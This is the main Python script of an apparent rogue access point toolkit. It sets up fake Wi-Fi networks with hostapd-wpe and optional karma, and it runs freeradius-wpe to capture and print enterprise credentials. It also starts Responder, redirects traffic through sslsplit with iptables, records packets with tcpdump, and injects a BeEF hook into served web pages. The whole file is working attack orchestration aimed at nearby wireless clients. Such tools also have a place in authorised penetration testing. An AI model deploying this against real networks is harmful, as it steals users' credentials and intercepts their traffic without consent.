#!/usr/bin/python
import os
import thread
import time
import subprocess
import select
from netaddr import IPAddress
import netifaces

import config
from core.libs import utils
from core.libs import options as Options
from core.libs import conf_manager
from core.libs import cert_wizard
from core.libs import clone_wizard
from core.libs import hostile_portal

def is_interface_up(interface):
    addr = netifaces.ifaddresses(interface)
    return netifaces.AF_INET in addr

def CatchThread(input, threadType):
    raw_input('Press enter to quit %s...' % threadType)

    input.append(True)

    return

def ReadFreeRadiusLog(options):
    print("[*] Displaying of captured credentials mode enabled")
    input = []
    thread.start_new_thread(CatchThread, (input, 'freeradius_log'))
    while not input:
        print("[-] Checking if freeradius-server-wpe.log is empty, path: %s" % config.wpelogfile)
        if(os.stat(config.wpelogfile).st_size == 0):
            print("[-] %s is empty, checking default freeradius install location: %s" % (config.wpelogfile, config.wpelogfile_default_install))
            if(os.stat(config.wpelogfile_default_install).st_size != 0):
                print("[-] It appears %s has content, proceeding with the monitoring of this file" % config.wpelogfile_default_install)
                target_file = config.wpelogfile_default_install
        elif(os.stat(config.wpelogfile).st_size != 0):
            print("[-] It appears %s has content, proceeding with the monitoring of this file" % config.wpelogfile)
            target_file = config.wpelogfile
        else:
            raise 
        f = subprocess.Popen(['tail','-f',target_file],\
                stdout=subprocess.PIPE,stderr=subprocess.PIPE)

        p = select.poll()
        p.register(f.stdout)

        while not input:
            if p.poll(1):
                print f.stdout.readline().strip("\n")
            time.sleep(1)

    f.kill()

    return

def iptablesStart():
    utils.Iptables.accept_all()
    utils.Iptables.flush()
    utils.Iptables.flush('nat')

    return 0

def dhcpiptablesStart():
    utils.Iptables.flush()
    utils.Iptables.flush('nat')

    utils.Iptables.isc_dhcp_server_rules(options['ip_address'], options['interface'], options['secondary_interface'])
    
    return 0

def sslsplitiptablesStart(sslsplit_encrypted_port):
    utils.Iptables.sslsplit_rules(sslsplit_encrypted_port)
    
    return 0

def iptablesStop():
    utils.Iptables.accept_all()
    utils.Iptables.flush()
    utils.Iptables.flush('nat')

    return 0

def dhcpRoute(ip_address):
    return ", ".join(ip_address.split("."))

def dhcpCidr(dhcp_netmask):
    return IPAddress(dhcp_netmask).netmask_bits()



if __name__ == '__main__':
    options = Options.set_options()
    if options == 1:
        exit(1)

    if options['cert_wizard']:
        cert_wizard.cert_wizard()
        exit(0)
    else:
        pass

    if options['clone_wizard']:
        if (clone_wizard.clone_wizard(config.httrack_bin, options['clone_target'], options['clone_dest']) != 0):
            exit(1)
        else:
            exit(0)
    else:
        pass

    if(options['sslsplit'] and options['cert_nopass']):

        print("[*] Generating a ca.key without a password")
        os.system("openssl rsa -in %s/ca.key -out %s/ca_no_pass.key" % (config.certs_dir, config.certs_dir))
        os.system("openssl req -new -x509 -days 1826 -key %s -out %s" % (config.ca_key, config.ca_crt))

        exit(0)

    else:
        pass

    try: 
        if is_interface_up(options['interface']):
            pass
    except Exception as e:
        print("Interface %s does not exist, %s" % (options['interface'], e))
        exit(1)

    print("[*] Launching the rogue toolkit v%s" % config.__version__)
    if(options['show_options']):
        print("[+] Options: %s" % options)

    utils.nmcli.set_unmanaged(options['interface'])

    # creates the required hostapd-wpe.conf
    if options['auth'] == 'open':
        conf_manager.hostapd_open_cnf.configure(
            driver=options['driver'],
            interface=options['interface'],
            ssid=options['essid'],
            hw_mode=options['hw_mode'],
            ieee80211n=options['ieee80211n'],
            bssid=options['bssid'],
            channel=options['channel'],
            country_code=options['country_code'],
            macaddr_acl=options['macaddr_acl'],
            auth_algs=options['auth_algs'],
            essid_mask=options['essid_mask'],
            wmm_enabled=options['wmm_enabled'],
            ht_capab=options['ht_capab'],
            require_ht=options['require_ht'],
            ieee80211ac=options['ieee80211ac'],
            vht_oper_chwidth=options['vht_oper_chwidth'],
            vht_oper_centr_freq_seg0_idx=options['vht_oper_centr_freq_seg0_idx'],
            vht_oper_centr_freq_seg1_idx=options['vht_oper_centr_freq_seg1_idx'],
            require_vht=options['require_vht'],
            ieee80211d=options['ieee80211d'],
            ieee80211h=options['ieee80211h'],
            ap_isolate=options['ap_isolate']
        )
    elif options['auth'] == 'wep':
        conf_manager.hostapd_wep_cnf.configure(
            driver=options['driver'],
            interface=options['interface'],
            ssid=options['essid'],
            hw_mode=options['hw_mode'],
            ieee80211n=options['ieee80211n'],
            bssid=options['bssid'],
            channel=options['channel'],
            country_code=options['country_code'],
            macaddr_acl=options['macaddr_acl'],
            auth_algs=options['auth_algs'],
            essid_mask=options['essid_mask'],
            wmm_enabled=options['wmm_enabled'],
            ht_capab=options['ht_capab'],
            require_ht=options['require_ht'],
            ieee80211ac=options['ieee80211ac'],
            vht_oper_chwidth=options['vht_oper_chwidth'],
            vht_oper_centr_freq_seg0_idx=options['vht_oper_centr_freq_seg0_idx'],
            vht_oper_centr_freq_seg1_idx=options['vht_oper_centr_freq_seg1_idx'],
            require_vht=options['require_vht'],
            ieee80211d=options['ieee80211d'],
            ieee80211h=options['ieee80211h'],
            ap_isolate=options['ap_isolate'],
            wep_default_key=options['wep_default_key'],
            wep_key=options['wep_key'],
        )
    elif (options['auth'] == 'wpa-personal'):
        conf_manager.hostapd_wpa_psk_cnf.configure(
            driver=options['driver'],
            interface=options['interface'],
            ssid=options['essid'],
            hw_mode=options['hw_mode'],
            ieee80211n=options['ieee80211n'],
            bssid=options['bssid'],
            channel=options['channel'],
            country_code=options['country_code'],
            macaddr_acl=options['macaddr_acl'],
            auth_algs=options['auth_algs'],
            essid_mask=options['essid_mask'],
            wmm_enabled=options['wmm_enabled'],
            ht_capab=options['ht_capab'],
            require_ht=options['require_ht'],
            ieee80211ac=options['ieee80211ac'],
            vht_oper_chwidth=options['vht_oper_chwidth'],
            vht_oper_centr_freq_seg0_idx=options['vht_oper_centr_freq_seg0_idx'],
            vht_oper_centr_freq_seg1_idx=options['vht_oper_centr_freq_seg1_idx'],
            require_vht=options['require_vht'],
            ieee80211d=options['ieee80211d'],
            ieee80211h=options['ieee80211h'],
            ap_isolate=options['ap_isolate'],
            wpa=options['wpa'],
            wpa_passphrase=options['wpa_passphrase'],
            wpa_pairwise=options['wpa_pairwise'],
            rsn_pairwise=options['rsn_pairwise']
        )
    else:
        conf_manager.hostapd_wpa_eap_cnf.configure(
            driver=options['driver'],
            interface=options['interface'],
            ssid=options['essid'],
            hw_mode=options['hw_mode'],
            ieee80211n=options['ieee80211n'],
            bssid=options['bssid'],
            channel=options['channel'],
            country_code=options['country_code'],
            macaddr_acl=options['macaddr_acl'],
            auth_algs=options['auth_algs'],
            essid_mask=options['essid_mask'],
            wmm_enabled=options['wmm_enabled'],
            ht_capab=options['ht_capab'],
            require_ht=options['require_ht'],
            ieee80211ac=options['ieee80211ac'],
            vht_oper_chwidth=options['vht_oper_chwidth'],
            vht_oper_centr_freq_seg0_idx=options['vht_oper_centr_freq_seg0_idx'],
            vht_oper_centr_freq_seg1_idx=options['vht_oper_centr_freq_seg1_idx'],
            require_vht=options['require_vht'],
            ieee80211d=options['ieee80211d'],
            ieee80211h=options['ieee80211h'],
            ap_isolate=options['ap_isolate'],
            wpa=options['wpa'],
            wpa_pairwise=options['wpa_pairwise'],
            rsn_pairwise=options['rsn_pairwise'],
            ieee8021x=options['ieee8021x'],
            eapol_version=options['eapol_version'],
            eapol_workaround=options['eapol_workaround'],
            own_ip_addr=options['own_ip_addr'],
            auth_server_addr=options['auth_server_addr'],
            auth_server_shared_secret=options['auth_server_shared_secret'],
            auth_server_port=options['auth_server_port'],
            acct_server_addr=options['acct_server_addr'],
            acct_server_shared_secret=options['acct_server_shared_secret'],
            acct_server_port=options['acct_server_port'],
            eap_user_file=config.eap_user_file,
            ca_pem=config.ca_pem,
            server_pem=config.server_pem,
            private_key=config.private_pem,
            dh_file=config.dh_file
        )

        conf_manager.freeradius_radiusd_conf.configure(
            logdir=config.logdir,
            radiuslog=config.radiuslog,
            wpelogfile=config.wpelogfile,
            cert_dir=config.certs_dir,
            log_goodpass=options['log_goodpass'],
            log_badpass=options['log_badpass']
        )
    
        if(options['auth'] == 'fast'):
            conf_manager.freeradius_eap_fast_conf.configure(
                default_eap_type=options['default_eap_type'],
                private_key_file=config.private_key,
                certificate_file=config.server_pem,
                ca_file=config.ca_pem,
                dh_file=config.dh_file,
                ca_path=config.certs_dir
            )
        else:
            conf_manager.freeradius_eap_conf.configure(
                default_eap_type=options['default_eap_type'],
                private_key_file=config.private_key,
                certificate_file=config.server_pem,
                ca_file=config.ca_pem,
                dh_file=config.dh_file,
                ca_path=config.certs_dir
            )
    
        conf_manager.freeradius_clients_conf.configure(
            own_ip_addr=options['own_ip_addr'],
            auth_server_shared_secret=options['auth_server_shared_secret'],
            radius_protocol=options['radius_protocol']
        )

        print("[*] Launching freeradius-wpe")
        utils.Freeradius.hardstart(config.freeradius_command % (config.freeradius_log, config.freeradius_working_dir), verbose=False)


    ##### Launching Program #####

    conf_manager.default_dhcp.configure(
        default_dhcpv4_conf_location=config.default_dhcpv4_conf_location,
        interface=options['interface']
    )

    conf_manager.dhcpd_conf.configure(
        default_lease_time=options['default_lease_time'],
        max_lease_time=options['max_lease_time'],
        name_servers=("%s, %s" % (options['primary_name_server'], options['secondary_name_server'])),
        router=options['ip_address'],
        route_gateway=dhcpRoute(options['ip_address']),
        route_cidr=dhcpCidr(options['dhcp_netmask']),
        route_subnet=dhcpRoute(options['route_subnet']),
        dhcp_subnet=options['dhcp_subnet'],
        dhcp_netmask=options['dhcp_netmask'],
        dhcp_pool_start=options['dhcp_pool_start'],
        dhcp_pool_end=options['dhcp_pool_end']
    )

    # sets the local ip address of the wireless interface before startign the dhcp service
    os.system('ifconfig %s %s netmask %s' % (options['interface'], options['ip_address'], options['dhcp_netmask']))
    dhcpiptablesStart()
    utils.IscDhcpServer.start()

    print("[*] Launching hostapd-wpe")
    if options['karma']:
        utils.Hostapd.hardstart(config.hostapd_command_with_karma % config.hostapd_conf_full, verbose=False)
    else:
        utils.Hostapd.hardstart(config.hostapd_command % (config.hostapd_conf_full), verbose=False)


    ##### Middle Operations #####

    if(options['pcap_filename'] is not None):
        print("[*] Enabling log capturing for interface: %s" % options['interface'])
        utils.Tcpdump.hardstart(config.tcpdump_cmd % (options['interface'], (config.tcpdump_logdir + '/' + options['pcap_filename'])), verbose=False)
    else:
        pass

    if(options['internet']):
        print("[*] Enabling IP forwarding")
        utils.set_ipforward(1)
    else:
        pass

    if (options['auth'] == 'wpa-enterprise'):
        if options['print_creds']:
            ReadFreeRadiusLog(options)
        else:
            pass
    else:
        pass

    if(options['responder'] is True and options['hostile_mode'] != 'responder'):
        print("[+] Pushing default responder configuration file")
        conf_manager.responder_default_conf.configure()
        utils.Responder.hardstart(config.responder_cmd % (
            options['interface']
            ),
            verbose=False
        )
    else:
        pass

    if(options['sslsplit'] is True and options['cert_nopass'] is False):

        utils.Sslsplit.hardstart(config.sslsplit_cmd % (
            config.sslsplit_log,
            config.sslsplit_jail,
            config.sslsplit_tmp,
            config.ca_key,
            config.ca_crt,
            options['sslsplit_encrypted_port']
            ))

        sslsplitiptablesStart(options['sslsplit_encrypted_port'])
    else:
        pass

    if(options['hostile_portal']):
        if(options['hostile_mode'] == "beef"):
            utils.Beef.start()

            hostile_portal.insert(
                webroot=options['httpd_root'],
                target_file=options['target_file'],
                addr=options['ip_address'],
                hook=options['hostile_hook'],
                marker=options['hostile_marker']
            )

            subprocess.Popen([config.default_browser + " http://127.0.0.1:3000/ui/authentication"], shell=True)
        elif(options['hostile_mode'] == 'responder'):
            print("[+] Pushing custom responder configuration file")
            conf_manager.responder_no_http_conf.configure()
            utils.Responder.hardstart(config.responder_cmd % (
                options['interface']
                ),
                verbose=False
            )

            hostile_portal.insert(
                webroot=options['httpd_root'],
                target_file=options['target_file'],
                addr=options['ip_address'],
                hook=options['hostile_hook'],
                marker=options['hostile_marker']
            )
        else:
            pass
    else:
        pass

    if(options['enable_httpd']):

        if(options['httpd_ssl']):
            conf_manager.http_ssl_cnf.configure(
                port=options['httpd_port'],
                addr=options['ip_address'],
                webroot=options['httpd_root'],
                error_log=config.http_error_log,
                custom_log=config.http_custom_log,
                server_pem=config.ca_crt,
                private_key=config.ca_key
            )

            utils.Httpd.enableModule()
        else:
            conf_manager.http_cnf.configure(
                port=options['httpd_port'],
                webroot=options['httpd_root'],
                error_log=config.http_error_log,
                custom_log=config.http_custom_log
            )

        utils.Httpd.disableDefault()
        utils.Httpd.enableSite(config.http_name_conf)

        utils.Httpd.start()

    else:
        pass

    # pause execution until user quits
    raw_input('Press enter to quit...')


    ##### Ending Program #####

    # kill daemons
    utils.Hostapd.kill()
    utils.IscDhcpServer.stop()
    
    if (options['auth'] == 'wpa-enterprise'):
        utils.Freeradius.kill()

    if(options['internet']):
        print("[*] Disabling IP forwarding")
        utils.set_ipforward(0)

    if(options['sslsplit']):
        utils.Sslsplit.kill()

    if(options['responder']):
        utils.Responder.kill_by_name('Responder')
        print("[+] Restoring default responder configuration")
        conf_manager.responder_default_conf.configure()

    if(options['pcap_filename'] is not None):
        utils.Tcpdump.kill()

    if(options['hostile_portal']):
        if(options['hostile_mode'] == "beef"):
            utils.Beef.stop()
        else:
            pass
    else:
        pass

    if(options['enable_httpd']):
        utils.Httpd.stop()

        utils.Httpd.disableSite(config.http_name_conf, config.http_sites_available)
        utils.Httpd.enableDefault()
        if(options['httpd_ssl']):
            utils.Httpd.disableModule()

    else:
        pass

    iptablesStop()

    # cleanly allow network manager to regain control of interface
    utils.nmcli.set_managed(options['interface'])

    exit(0)